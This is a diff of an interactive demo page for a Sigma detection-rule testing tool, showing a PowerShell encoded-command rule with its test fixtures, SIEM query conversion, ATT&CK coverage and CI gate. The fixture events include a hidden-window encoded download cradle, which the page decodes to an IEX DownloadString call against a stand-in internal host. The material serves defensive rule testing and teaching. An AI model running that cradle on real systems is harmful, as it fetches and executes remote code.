-        <label class="opt"><input type="radio" name="v" value="nospace"><b>Flag without the spaces</b><span>The "tidied quotes" edit from stop 03: contains "-e"</span></label>
-      </div>
-      <div class="res" id="res"></div>
-    </div>
-    <p class="callout" style="margin-top:22px"><b>The near misses are the point.</b> <code>-ExecutionPolicy</code> starts with <code>-E</code>. <code>-Encoding</code> starts with <code>-Enco</code>. Random noise would never catch those. Someone who knows the attack wrote those test events on purpose, and now every future edit is checked against them.</p>
-  </div>
-</section>
-
-<section class="station" id="s6" data-stop="06">
-  <div class="wrap">
-    <p class="num">STOP 06</p>
-    <h2>Ship it to the SIEM</h2>
-    <p class="sub">Same rule, two query languages, no retyping. <code>detforge convert --target all</code> writes both into <code>dist/</code>. This is the real output, shortened.</p>
-    <div class="tabs" role="tablist">
-      <button role="tab" aria-selected="true" data-p="p-splunk">Splunk SPL</button>
-      <button role="tab" aria-selected="false" data-p="p-lucene">Elastic Lucene</button>
-    </div>
-    <div class="panel on q" id="p-splunk"><pre>Channel="Microsoft-Windows-Sysmon/Operational" EventID=1
-Image IN ("*\\powershell.exe", "*\\pwsh.exe") OR OriginalFileName IN ("PowerShell.EXE", "pwsh.dll")
-CommandLine="* -e *" OR CommandLine="* /e *" OR CommandLine="* –e *" OR CommandLine="* —e *"
-OR CommandLine="* -ec *" OR CommandLine="* /ec *" OR CommandLine="* -enc *" OR CommandLine="* /enc *"
-<span class="dim">... 60 more spellings, down to ... OR CommandLine="* ―encodedcommand *"</span></pre></div>
-    <div class="panel q" id="p-lucene"><pre>((process.executable.caseless:(*\\powershell.exe OR *\\pwsh.exe))
-  OR (process.pe.original_file_name:(PowerShell.EXE OR pwsh.dll)))
-AND (process.command_line:(*\ \-e\ * OR *\ \/e\ * OR *\ –e\ * OR *\ —e\ * OR *\ ―e\ *)
-  OR process.command_line:(*\ \-ec\ * OR *\ \/ec\ * OR ...)
-<span class="dim">... the same 15 flags × 5 dash forms, with ECS field names</span></pre></div>
-    <p class="note" style="margin-top:12px">Notice <code>windash</code> did its job: the dash, the slash, and three Unicode dashes that Word likes to substitute. Attackers know Word does that too.</p>
-  </div>
-</section>
-
-<section class="station" id="s7" data-stop="07">
-  <div class="wrap">
-    <p class="num">STOP 07</p>
-    <h2>What do we actually cover?</h2>
-    <p class="sub"><code>detforge coverage</code> reads the ATT&amp;CK tags on every rule and draws the map. Lit cells are covered techniques. Click one.</p>
-    <div class="card">
-      <div class="h">ATT&amp;CK Enterprise · 2 rules cover 3 techniques across 2 tactics</div>
-      <div class="matrix" id="matrix"></div>
-      <div class="legend" id="legend">Two rules is a small start. The point is that the map is generated, so it is never out of date.</div>
-    </div>
-    <p class="note" style="margin-top:12px">It also writes <code>dist/attack-layer.json</code>, a layer you can load straight into the ATT&amp;CK Navigator, and <code>dist/coverage.md</code> for the report.</p>
-  </div>
-</section>
-
-<section class="station" id="s8" data-stop="08">
-  <div class="wrap">
-    <p class="num">STOP 08</p>
-    <h2>The build gate</h2>
-    <p class="sub">All of this runs in GitHub Actions on every push and pull request. A rule that misses its attack or matches normal traffic cannot be merged. Try it.</p>
-    <div class="card ci">
-      <div class="h">CI · pull request #14 · "simplify powershell rule"</div>
-      <div class="step"><span class="ic">✓</span><span>Ruff</span><span class="dur">4s</span></div>
-      <div class="step"><span class="ic">✓</span><span>Unit tests</span><span class="dur">11s</span></div>
-      <div class="step"><span class="ic">✓</span><span>Lint rules</span><span class="dur">3s</span></div>
-      <div class="step"><span class="ic" id="ci-test">✓</span><span>Test rules</span><span class="dur">3s</span></div>
-      <div class="fails" id="ci-fails">FAIL rules/windows/execution/powershell_encoded_command.yml<br>  - TN #1 matched: near-miss: -ExecutionPolicy starts with -e but is not -e<br>  - TN #2 matched: near-miss: -Encoding UTF8 shares the -enco prefix with -EncodedCommand<br>  - baseline event matched: admin runs a script with -File<br>  - baseline event matched: Out-File with the -Encoding parameter<br>  ... test: 1 of 2 rule(s) failed</div>
-      <div class="step"><span class="ic" id="ci-conv">✓</span><span>Convert rules</span><span class="dur">5s</span></div>
-      <div class="step"><span class="ic" id="ci-cov">✓</span><span>Coverage</span><span class="dur">2s</span></div>
-      <div class="step"><span class="ic">✓</span><span>Report (always runs, lands in the job summary)</span><span class="dur">1s</span></div>
-      <div class="merge">
-        <button class="btn sm hot" id="merge">Merge pull request</button>
-        <span class="msg" id="ci-msg">All checks have passed.</span>
-      </div>
-      <div class="btns" style="margin-top:14px">
-        <button class="btn sm" id="ci-break">Push the "tidied quotes" edit</button>
-        <button class="btn sm" id="ci-fix">Fix it</button>
-      </div>
-    </div>
-    <p class="callout" style="margin-top:22px"><b>That is the whole idea.</b> The reviewer does not need to know the rule by heart. The failing event is right there in the job summary, by the description its author gave it.</p>
-  </div>
-</section>
-
-<section class="end" id="end">
-  <div class="wrap">
-    <p class="kicker">Run it</p>
-    <h2>Five commands, then CI does it for you.</h2>
-    <div class="cols" style="margin-top:20px">
-      <div>
-        <h3>Quickstart</h3>
-        <div class="cmd"><pre>git clone https://github.com/RedaKarrach/detforge.git
-cd detforge
-python -m venv .venv
-.venv\Scripts\activate    <span class="c"># Linux/macOS: source .venv/bin/activate</span>
-pip install -e ".[dev]"
-
-detforge lint --offline
-detforge test
-detforge convert --target all
-detforge coverage
-detforge report</pre></div>
-        <h3>On your own rules</h3>
-        <div class="cmd"><pre><span class="c"># pyproject.toml</span>
+<span class="c"># your own rules: set these in pyproject.toml</span>
 [tool.detforge]
 rules = "sigma/rules"
 fixtures = "sigma/tests"
-out = "build"</pre></div>
-      </div>
-      <div>
-        <h3>Writing a rule</h3>
-        <ul>
-          <li>Put it in <code>rules/windows/&lt;tactic&gt;/&lt;rule_name&gt;.yml</code>, with a technique tag and a tactic tag.</li>
-          <li>Add <code>tests/fixtures/&lt;rule id&gt;/tp.jsonl</code> and <code>tn.jsonl</code>: one JSON event per line, at least two each. Make the TN events near misses, not noise.</li>
-          <li>Add a row to <code>docs/RULES.md</code>: what it looks for, what legitimately trips it, how an attacker gets around it. If you cannot write the last column, the rule is not finished.</li>
-          <li>Run <code>detforge lint --offline</code> and <code>detforge test</code>.</li>
-        </ul>
-        <h3 style="margin-top:18px">What it does not do</h3>
-        <ul>
-          <li>The fixtures prove the logic, not that your Sysmon config writes those exact field names. Export real events from a lab VM when you can.</li>
-          <li>Single-event rules only. Correlation rules are out of scope.</li>
-          <li>SQLite tests the rule's own field names. Review the converted Splunk and Elastic queries in the SIEM.</li>
-        </ul>
-        <h3 style="margin-top:18px">Stack</h3>
-        <ul>
-          <li>pySigma with the SQLite, Splunk and Elasticsearch backends. Python 3.11+. MIT.</li>
-          <li><a href="https://github.com/RedaKarrach/detforge">Source on GitHub</a> · <a href="https://github.com/RedaKarrach/detforge/blob/main/docs/RULES.md">RULES.md</a></li>
-        </ul>
-      </div>
+out = "build"
+
+<span class="c"># writing a rule</span>
+1. rules/windows/&lt;tactic&gt;/&lt;rule_name&gt;.yml, with a technique tag and a tactic tag
+2. tests/fixtures/&lt;rule id&gt;/tp.jsonl and tn.jsonl, two events each at least.
+   make the tn events near misses, not noise. that is where rules break.
+3. a row in docs/RULES.md: logic, false positives, evasions
+4. detforge lint --offline && detforge test
+
+<span class="c"># what it does not do</span>
+- fixtures prove the logic, not that your Sysmon writes those field names. export real events when you can.
+- single-event rules only. no correlation.
+- SQLite tests the rule's own field names. review the converted Splunk and Elastic queries in the SIEM.
+
+<span class="c"># stack</span>
+pySigma (sqlite, splunk, elasticsearch backends) · Python 3.11+ · typer + rich · pytest · GitHub Actions</pre>
+      <p style="margin-top:18px"><a href="https://github.com/RedaKarrach/detforge">source</a> · <a href="https://github.com/RedaKarrach/detforge/blob/main/docs/RULES.md">RULES.md</a> · <a href="#top" id="restart">[r] restart</a> · built by <a href="https://github.com/RedaKarrach">Mohamed Reda Karrach</a>. the event, user and host names are from the test fixtures and are made up.</p>
     </div>
   </div>
-</section>
-
-<footer><div class="wrap">All command output on this page comes from running DetForge on its own repository. The attack, user and host names are from the test fixtures and are made up. Built by <a href="https://github.com/RedaKarrach">Mohamed Reda Karrach</a>.</div></footer>
+</div>
 
 <script>
 (function () {
-  // progress
-  var stations = Array.prototype.slice.call(document.querySelectorAll('.station'));
-  var bar = document.getElementById('bar'), stop = document.getElementById('stop');
-  var ticking = false;
-  function update() {
-    var line = window.innerHeight * 0.4, idx = -1;
-    for (var i = 0; i < stations.length; i++) { if (stations[i].getBoundingClientRect().top <= line) idx = i; else break; }
-    var n = idx + 1;
-    stop.innerHTML = 'stop <b>' + (n < 10 ? '0' + n : n) + '</b> / 08';
-    bar.style.width = Math.round((n / stations.length) * 100) + '%';
-  }
-  window.addEventListener('scroll', function () { if (ticking) return; ticking = true; setTimeout(function () { ticking = false; update(); }, 16); }, { passive: true });
-  update();
-
-  // stop 01
-  document.getElementById('decode').addEventListener('click', function () {
-    document.getElementById('decoded').classList.add('on'); this.disabled = true; this.textContent = 'Decoded';
-  });
-
-  // stop 02
-  var EXPL = {
-    img: '<b>Is it PowerShell?</b> Two ways to say yes: the file name ends in powershell.exe or pwsh.exe, <em>or</em> the OriginalFileName stamped inside the binary says so. Rename powershell.exe to svc.exe and the second check still catches it.',
-    cli: '<b>Does the command line carry an encoded-command flag?</b> PowerShell accepts -e, -ec, -en, -enc and every longer prefix up to -EncodedCommand. The spaces on each side stop -Encoding and -ExecutionPolicy from matching. <code>windash</code> adds the slash and Unicode-dash forms for free.',
-    cond: '<b>Both must be true.</b> PowerShell alone is normal. An encoded flag alone could be anything. Together they are worth a high-severity alert.'
-  };
-  document.querySelectorAll('.yaml .part').forEach(function (p) {
-    p.addEventListener('click', function () {
-      document.querySelectorAll('.yaml .part').forEach(function (q) { q.classList.remove('on'); });
-      p.classList.add('on');
-      document.getElementById('explain').innerHTML = EXPL[p.getAttribute('data-x')];
-    });
-  });
-
-  // stop 03
-  document.querySelectorAll('.way').forEach(function (w) {
-    function toggle() { var on = w.classList.contains('on'); document.querySelectorAll('.way').forEach(function (x) { x.classList.remove('on'); }); if (!on) w.classList.add('on'); }
-    w.addEventListener('click', toggle);
-    w.addEventListener('keydown', function (e) { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); toggle(); } });
-  });
-
-  // stop 04
-  document.getElementById('runlint').addEventListener('click', function () {
-    var items = document.querySelectorAll('#checks li .st'), pill = document.getElementById('lintpill');
-    pill.textContent = 'running'; pill.className = 'pill';
-    items.forEach(function (st, i) { st.textContent = '·'; st.classList.remove('ok'); setTimeout(function () { st.textContent = '✓'; st.classList.add('ok'); if (i === items.length - 1) { pill.textContent = 'lint: no issues'; pill.className = 'pill pass'; } }, 260 * (i + 1)); });
-  });
-  document.getElementById('showlintfail').addEventListener('click', function () { document.getElementById('lintfail').classList.toggle('on'); });
-
-  // stop 05: the rule lab, on the repository's real fixture events
+  // ---------- data: the repository's real fixture events ----------
   var TP = [
     { d: 'short -e flag, hidden window, download cradle', Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', OriginalFileName: 'PowerShell.EXE', CommandLine: 'powershell.exe -nop -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA1AC8AYQAuAHAAcwAxACIAKQA=' },
     { d: 'slash form /enc, normalised to -enc by windash', Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', OriginalFileName: 'PowerShell.EXE', CommandLine: '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" /enc RwBlAHQALQBMAG8AYwBhAGwAVQBzAGUAcgAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnAA==' },
@@ -550,90 +155,193 @@ out = "build"</pre></div>
   ];
   var FLAGS = ['e','ec','en','enc','enco','encod','encode','encoded','encodedc','encodedco','encodedcom','encodedcomm','encodedcomma','encodedcomman','encodedcommand'];
   var DASHES = ['-', '/', '\u2013', '\u2014', '\u2015'];
-  function isPS(e) {
-    var img = e.Image.toLowerCase(), ofn = e.OriginalFileName.toLowerCase();
-    return /\\powershell\.exe$/.test(img) || /\\pwsh\.exe$/.test(img) || ofn === 'powershell.exe' || ofn === 'pwsh.dll';
-  }
+  function isPS(e) { var img = e.Image.toLowerCase(), ofn = e.OriginalFileName.toLowerCase(); return /\\powershell\.exe$/.test(img) || /\\pwsh\.exe$/.test(img) || ofn === 'powershell.exe' || ofn === 'pwsh.dll'; }
   function hasFlag(e, v) {
     var cl = e.CommandLine.toLowerCase();
     if (v === 'strict') return DASHES.some(function (d) { return cl.indexOf(' ' + d + 'encodedcommand ') !== -1; });
     if (v === 'nospace') return DASHES.some(function (d) { return cl.indexOf(d + 'e') !== -1; });
     return FLAGS.some(function (f) { return DASHES.some(function (d) { return cl.indexOf(' ' + d + f + ' ') !== -1; }); });
   }
-  function matches(e, v) { if (v === 'img') return isPS(e); return isPS(e) && hasFlag(e, v); }
-  function esc(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;'); }
-  function short(s) { return s.length > 90 ? s.slice(0, 88) + '…' : s; }
-  function group(title, hint, list, v, wantMatch) {
-    var html = '<div class="grp"><div class="h">' + title + ' <span class="pill">' + hint + '</span></div>';
-    var bad = 0;
-    list.forEach(function (e, i) {
-      var m = matches(e, v), ok = (m === wantMatch);
-      if (!ok) bad++;
-      html += '<div class="ev ' + (ok ? 'good' : 'bad') + '"><div><div class="d">' + esc(e.d) + '</div><div class="cl">' + esc(short(e.CommandLine)) + '</div></div><span class="pill ' + (ok ? 'pass' : 'fail') + '">' + (m ? 'matched' : 'no match') + (ok ? '' : (wantMatch ? ' · missed' : ' · false positive')) + '</span></div>';
-    });
-    return { html: html + '</div>', bad: bad };
+  function matches(e, v) { return v === 'img' ? isPS(e) : (isPS(e) && hasFlag(e, v)); }
+  function esc(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;'); }
+  function lpad(s, n) { s = String(s); while (s.length < n) s = ' ' + s; return s; }
+  function testTable(v) {
+    var tpHit = 0, tnFp = 0, blFp = 0, lines = [];
+    TP.forEach(function (e, i) { if (matches(e, v)) tpHit++; else lines.push('  - TP #' + (i + 1) + ' missed: ' + e.d); });
+    TN.forEach(function (e, i) { if (matches(e, v)) { tnFp++; lines.push('  - TN #' + (i + 1) + ' matched: ' + e.d); } });
+    BASE.forEach(function (e) { if (matches(e, v)) { blFp++; lines.push('  - baseline event matched: ' + e.d); } });
+    var ok = tpHit === TP.length && tnFp === 0 && blFp === 0;
+    var res = ok ? '<span class="g">PASS</span>' : '<span class="r">FAIL</span>';
+    var out = '<span class="box">┌───────────────────────────────────────────────────────────┬─────┬───────┬─────────────┬────────┐\n' +
+      '│ Rule                                                      │  TP │ TN fp │ Baseline fp │ Result │\n' +
+      '├───────────────────────────────────────────────────────────┼─────┼───────┼─────────────┼────────┤\n' +
+      '│ rules/windows/execution/powershell_encoded_command.yml    │ ' + tpHit + '/' + TP.length + ' │ ' + lpad(tnFp, 5) + ' │ ' + lpad(blFp, 11) + ' │ ' + res + '   │\n' +
+      '│ rules/windows/lateral_movement/psexec_service_install.yml │ 3/3 │     0 │           0 │ <span class="g">PASS</span>   │\n' +
+      '└───────────────────────────────────────────────────────────┴─────┴───────┴─────────────┴────────┘</span>\n';
+    if (ok) out += '<span class="g">test: 2 rule(s) passed</span>';
+    else out += '<span class="r">FAIL rules/windows/execution/powershell_encoded_command.yml</span>\n' + esc(lines.join('\n')) + '\n<span class="r">test: 1 of 2 rule(s) failed</span>';
+    return out;
   }
-  function render(v) {
-    var tp = group('Must match', '3 attack events', TP, v, true);
-    var tn = group('Must not match', '3 near misses', TN, v, false);
-    var bl = group('Baseline', '14 events of a normal day', BASE, v, false);
-    var tpHit = TP.length - tp.bad, result = (tp.bad === 0 && tn.bad === 0 && bl.bad === 0) ? 'PASS' : 'FAIL';
-    var lines = '';
-    TP.forEach(function (e, i) { if (!matches(e, v)) lines += '<li>TP #' + (i + 1) + ' missed: ' + esc(e.d) + '</li>'; });
-    TN.forEach(function (e, i) { if (matches(e, v)) lines += '<li>TN #' + (i + 1) + ' matched: ' + esc(e.d) + '</li>'; });
-    BASE.forEach(function (e) { if (matches(e, v)) lines += '<li>baseline event matched: ' + esc(e.d) + '</li>'; });
-    var verdict = '<div class="verdict"><div class="row hd"><span>Rule</span><span>TP</span><span>TN fp</span><span>Baseline fp</span><span>Result</span></div>' +
-      '<div class="row"><span>powershell_encoded_command.yml</span><span>' + tpHit + '/' + TP.length + '</span><span>' + tn.bad + '</span><span>' + bl.bad + '</span><span class="' + result + '">' + result + '</span></div>' +
-      (lines ? '<ul>' + lines + '</ul>' : '') + '</div>';
-    document.getElementById('res').innerHTML = verdict + tp.html + tn.html + bl.html;
-  }
-  document.querySelectorAll('.opt input').forEach(function (r) {
-    r.addEventListener('change', function () {
-      document.querySelectorAll('.opt').forEach(function (o) { o.classList.remove('on'); });
-      r.parentNode.classList.add('on'); render(r.value);
-    });
-  });
-  render('full');
 
-  // stop 06 tabs
-  document.querySelectorAll('.tabs button').forEach(function (b) {
-    b.addEventListener('click', function () {
-      document.querySelectorAll('.tabs button').forEach(function (x) { x.setAttribute('aria-selected', 'false'); });
-      document.querySelectorAll('.panel').forEach(function (p) { p.classList.remove('on'); });
-      b.setAttribute('aria-selected', 'true'); document.getElementById(b.getAttribute('data-p')).classList.add('on');
-    });
-  });
-
-  // stop 07 matrix
-  var TACTICS = [['Recon', 10, 'Reconnaissance'], ['ResDev', 8, 'Resource Development'], ['InitAcc', 10, 'Initial Access'], ['Exec', 14, 'Execution'], ['Persist', 20, 'Persistence'], ['PrivEsc', 14, 'Privilege Escalation'], ['DefEva', 42, 'Defense Evasion'], ['CredAcc', 17, 'Credential Access'], ['Discov', 32, 'Discovery'], ['LatMov', 9, 'Lateral Movement'], ['Collect', 17, 'Collection'], ['C2', 17, 'Command and Control'], ['Exfil', 9, 'Exfiltration'], ['Impact', 14, 'Impact']];
-  var LIT = { 'Exec': [['T1059.001', 'PowerShell Encoded Command Execution'], ['T1569.002', 'PsExec Service Installation']], 'LatMov': [['T1021.002', 'PsExec Service Installation']] };
-  var matrix = document.getElementById('matrix'), legend = document.getElementById('legend');
-  TACTICS.forEach(function (t) {
-    var col = document.createElement('div'); col.className = 'tactic';
-    col.innerHTML = '<div class="t" title="' + t[2] + '">' + t[0] + '</div>';
-    var lit = LIT[t[0]] || [];
-    for (var i = 0; i < Math.min(t[1], 12); i++) {
-      var c = document.createElement('div'); c.className = 'cell';
-      if (i < lit.length) {
-        c.classList.add('lit'); c.title = lit[i][0];
-        (function (item, tactic) { c.addEventListener('click', function () { legend.innerHTML = '<b>' + item[0] + '</b> in ' + tactic + ' · covered by "' + item[1] + '"'; }); })(lit[i], t[2]);
-      }
-      col.appendChild(c);
+  // ---------- the eight questions ----------
+  var STEPS = [
+    {
+      q: 'An attacker just ran this on a laptop in your company. Would you notice?',
+      cmd: 'cat events/sysmon-1.json',
+      out: '<span class="c">// Sysmon event 1, process creation. One of thousands that hour.</span>\n{\n  "EventID": 1,\n  "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",\n  "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",\n  "User": "CORP\\\\jdoe",\n  "CommandLine": "powershell.exe -nop -w hidden -e <span class="y">SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA1AC8AYQAuAHAAcwAxACIAKQA=</span>"\n}',
+      menu: [
+        { k: '1', label: 'decode the base64', run: function () {
+          return '<span class="ps1">$</span> echo SQBFAFgA... | base64 -d | iconv -f UTF-16LE\n<span class="y">IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.5/a.ps1")</span>\n<span class="c">// downloads a script from another machine and runs it in memory. nothing touches disk.\n// -e is short for -EncodedCommand. the base64 is UTF-16, which is why it looks like that.\n// MITRE ATT&amp;CK T1059.001.</span>';
+        } }
+      ]
+    },
+    {
+      q: 'What does a detection rule for it look like?',
+      cmd: 'cat rules/windows/execution/powershell_encoded_command.yml',
+      out: '<span class="yaml"><span class="k">title:</span> PowerShell Encoded Command Execution\n<span class="k">tags:</span> [attack.execution, attack.t1059.001]\n<span class="k">logsource:</span> { product: windows, category: process_creation }\n<span class="k">detection:</span>\n<span class="part" data-x="1">  selection_img:\n    - Image|endswith: [\'\\powershell.exe\', \'\\pwsh.exe\']\n    - OriginalFileName: [\'PowerShell.EXE\', \'pwsh.dll\']</span>\n<span class="part" data-x="2">  selection_cli:\n    CommandLine|windash|contains:\n      - \' -e \'\n      - \' -ec \'\n      - \' -enc \'\n      <span class="c"># ... every abbreviation up to \' -encodedcommand \'</span></span>\n<span class="part" data-x="3">  condition: all of selection_*</span>\n<span class="k">level:</span> high</span>\n<span class="c">// click a part, or press 1, 2, 3.</span>',
+      menu: [
+        { k: '1', label: 'explain selection_img', run: function () { return '<span class="c"># selection_img: is it PowerShell? two ways to say yes: the file name, or the OriginalFileName\n# stamped inside the binary. rename powershell.exe to svc.exe and the second one still catches it.</span>'; } },
+        { k: '2', label: 'explain selection_cli', run: function () { return '<span class="c"># selection_cli: is there an encoded-command flag? PowerShell accepts -e, -ec, -en ... up to -EncodedCommand.\n# the spaces on each side keep -Encoding and -ExecutionPolicy out. windash adds / and the Unicode dashes Word substitutes.</span>'; } },
+        { k: '3', label: 'explain the condition', run: function () { return '<span class="c"># condition: both. PowerShell alone is normal. an encoded flag alone could be anything. together: high.</span>'; } }
+      ]
+    },
+    {
+      q: 'Rules get pasted into the SIEM and forgotten. Is this one even well formed?',
+      cmd: 'detforge lint --offline',
+      out: '<span class="g">lint: no issues</span>\n<span class="c">// checks: filename (snake_case .yml) · layout (folder = tactic tag) · required-field (title, id, status, description,\n// author, date, logsource, detection, falsepositives, level, tags) · tags (technique + tactic) · fixtures (tp.jsonl\n// and tn.jsonl, 2+ events each) · the pySigma validators. online, the MITRE tag validators run too.</span>',
+      menu: [
+        { k: '1', label: 'lint a folder of broken rules', run: function () {
+          return '<span class="ps1">$</span> detforge lint --offline --rules tests/data\n<span class="box">┌──────────────────────────┬──────────┬──────────────────────────────────────────────┐\n│ File                     │ Check    │ Message                                      │\n├──────────────────────────┼──────────┼──────────────────────────────────────────────┤\n│ BadlyNamedRule.yml       │ <span class="y">filename</span> │ file name must be snake_case and end in .yml │\n│ BadlyNamedRule.yml       │ <span class="y">layout</span>   │ folder \'execution\' does not match any tactic │\n│ missing_tactic_tag.yml   │ <span class="y">tags</span>     │ needs an ATT&amp;CK tactic tag (attack.&lt;tactic&gt;) │\n│ 71ed6c38-.../tp.jsonl    │ <span class="y">fixtures</span> │ missing tp.jsonl for this rule               │\n│ 71ed6c38-.../tn.jsonl    │ <span class="y">fixtures</span> │ missing tn.jsonl for this rule               │\n└──────────────────────────┴──────────┴──────────────────────────────────────────────┘</span>\n<span class="r">lint: 8 issue(s)</span>   <span class="c">// exit code 1. the build stops here.</span>';
+        } }
+      ]
+    },
+    {
+      q: 'Does it still catch the attack it was written for?',
+      cmd: 'detforge test',
+      out: function () { return testTable('full') + '\n<span class="c">// TP: attack events it must match (3 of 3). TN fp: near-miss events it wrongly matched. Baseline fp: events from\n// a normal day it wrongly matched. both must be zero. the TN events are not random noise: -ExecutionPolicy starts\n// with -E, -Encoding starts with -Enco. someone who knows the attack wrote them on purpose.</span>'; }
+    },
+    {
+      q: 'What happens when someone "simplifies" the rule six months later?',
+      cmd: 'git diff',
+      out: '<span class="c">diff --git a/rules/windows/execution/powershell_encoded_command.yml</span>\n<span class="b">@@ -30,4 +30,4 @@ detection:</span>\n<span class="r">-    condition: all of selection_*</span>\n<span class="g">+    condition: selection_img</span>\n<span class="c">// "the flag list was too long, PowerShell is suspicious anyway." no error. the dashboard stays green.</span>',
+      menu: [
+        { k: '1', label: 'detforge test', run: function () { return '<span class="ps1">$</span> detforge test\n' + testTable('img') + '\n<span class="c">// 8 benign events now page the on-call. the rule gets disabled by Friday. the test caught it in 3 seconds.</span>'; } },
+        { k: '2', label: 'try: only the full -EncodedCommand spelling', run: function () { return '<span class="r">-    CommandLine|windash|contains: [\' -e \', \' -ec \', ... ]</span>\n<span class="g">+    CommandLine|windash|contains: \' -encodedcommand \'</span>\n<span class="ps1">$</span> detforge test\n' + testTable('strict') + '\n<span class="c">// the other way to fail: it still fires on something, so nobody notices it stopped firing on -e and /enc.</span>'; } },
+        { k: '3', label: 'try: remove the spaces around the flags', run: function () { return '<span class="r">-      - \' -enc \'</span>\n<span class="g">+      - \'-enc\'</span>\n<span class="ps1">$</span> detforge test\n' + testTable('nospace') + '\n<span class="c">// -e is inside -ExecutionPolicy. -enco is inside -Encoding. the near-miss events exist for exactly this.</span>'; } },
+        { k: '4', label: 'git checkout -- rules/ && detforge test', run: function () { return '<span class="ps1">$</span> git checkout -- rules/ && detforge test\n' + testTable('full'); } }
+      ]
+    },
+    {
+      q: 'How does the rule get into the SIEM without retyping it?',
+      cmd: 'detforge convert --target all',
+      out: '<span class="g">convert: 4 file(s) written</span>\n<span class="ps1">$</span> ls dist/splunk dist/lucene\ndist/splunk: powershell_encoded_command.txt  psexec_service_install.txt\ndist/lucene: powershell_encoded_command.txt  psexec_service_install.txt',
+      menu: [
+        { k: '1', label: 'cat dist/splunk/powershell_encoded_command.txt', run: function () { return '<span class="ps1">$</span> cat dist/splunk/powershell_encoded_command.txt\nChannel="Microsoft-Windows-Sysmon/Operational" EventID=1\nImage IN ("*\\\\powershell.exe", "*\\\\pwsh.exe") OR OriginalFileName IN ("PowerShell.EXE", "pwsh.dll")\nCommandLine="* -e *" OR CommandLine="* /e *" OR CommandLine="* –e *" OR CommandLine="* —e *"\nOR CommandLine="* -ec *" OR CommandLine="* /ec *" OR CommandLine="* -enc *" OR CommandLine="* /enc *"\n<span class="c">... 60 more spellings, down to ... OR CommandLine="* ―encodedcommand *"</span>'; } },
+        { k: '2', label: 'cat dist/lucene/powershell_encoded_command.txt', run: function () { return '<span class="ps1">$</span> cat dist/lucene/powershell_encoded_command.txt\n((process.executable.caseless:(*\\\\powershell.exe OR *\\\\pwsh.exe))\n  OR (process.pe.original_file_name:(PowerShell.EXE OR pwsh.dll)))\nAND (process.command_line:(*\\ \\-e\\ * OR *\\ \\/e\\ * OR *\\ –e\\ * OR *\\ —e\\ * OR *\\ ―e\\ *)\n  OR process.command_line:(*\\ \\-ec\\ * OR *\\ \\/ec\\ * OR ...)\n<span class="c">... the same 15 flags × 5 dash forms, with ECS field names (ecs_windows pipeline)</span>'; } }
+      ]
+    },
+    {
+      q: 'What do we actually cover?',
+      cmd: 'detforge coverage',
+      out: 'coverage: 2 rule(s), 3 technique(s), 2 tactic(s) -> dist/attack-layer.json, dist/coverage.md\n\n<span class="box"><span class="c">  ATT&amp;CK Enterprise           [#] covered   [ ] not yet</span>\n  recon      resdev     initacc    <span class="y">exec</span>       persist    privesc    defeva\n  [ ][ ][ ]  [ ][ ][ ]  [ ][ ][ ]  <span class="y">[#][#]</span>[ ]  [ ][ ][ ]  [ ][ ][ ]  [ ][ ][ ]\n  credacc    discov     <span class="y">latmov</span>     collect    c2         exfil      impact\n  [ ][ ][ ]  [ ][ ][ ]  <span class="y">[#]</span>[ ][ ]  [ ][ ][ ]  [ ][ ][ ]  [ ][ ][ ]  [ ][ ][ ]</span>\n<span class="c">// two rules is a small start. the point is that the map is generated from the tags, so it is never out of date.\n// dist/attack-layer.json loads straight into the ATT&amp;CK Navigator.</span>',
+      menu: [
+        { k: '1', label: 'cat dist/coverage.md', run: function () { return '<span class="ps1">$</span> cat dist/coverage.md\n# ATT&amp;CK coverage\n\n2 rules cover 3 techniques across 2 tactics.\n\n## execution\n- T1059.001\n  - PowerShell Encoded Command Execution\n- T1569.002\n  - PsExec Service Installation\n\n## lateral-movement\n- T1021.002\n  - PsExec Service Installation'; } }
+      ]
+    },
+    {
+      q: 'Who stops a broken rule from shipping?',
+      cmd: 'git push origin simplify-powershell-rule',
+      out: '<span class="c">// GitHub Actions, on every push and pull request:</span>\n<span class="g">✓</span> Ruff                         4s\n<span class="g">✓</span> Unit tests                  11s\n<span class="g">✓</span> Lint rules                   3s\n<span class="r">✗</span> Test rules                   3s\n    <span class="r">FAIL rules/windows/execution/powershell_encoded_command.yml</span>\n      - TN #1 matched: near-miss: -ExecutionPolicy starts with -e but is not -e\n      - TN #2 matched: near-miss: -Encoding UTF8 shares the -enco prefix with -EncodedCommand\n      - baseline event matched: admin runs a script with -File\n      ... test: 1 of 2 rule(s) failed\n<span class="g">✓</span> Report (always runs, lands in the job summary)\n\n<span class="r">■ merge blocked</span>  <span class="c">// the reviewer does not need to know the rule by heart. the failing event is right there,\n                // by the description its author gave it.</span>',
+      menu: [
+        { k: '1', label: 'fix it and push again', run: function () { return '<span class="ps1">$</span> git checkout -- rules/ && git commit -am "keep the flag check" && git push\n<span class="g">✓</span> Ruff  <span class="g">✓</span> Unit tests  <span class="g">✓</span> Lint rules  <span class="g">✓</span> Test rules  <span class="g">✓</span> Convert rules  <span class="g">✓</span> Coverage  <span class="g">✓</span> Report\n<span class="g">■ merged.</span> the rule is live, with its tests beside it.'; } }
+      ]
     }
-    matrix.appendChild(col);
-  });
+  ];
 
-  // stop 08 CI
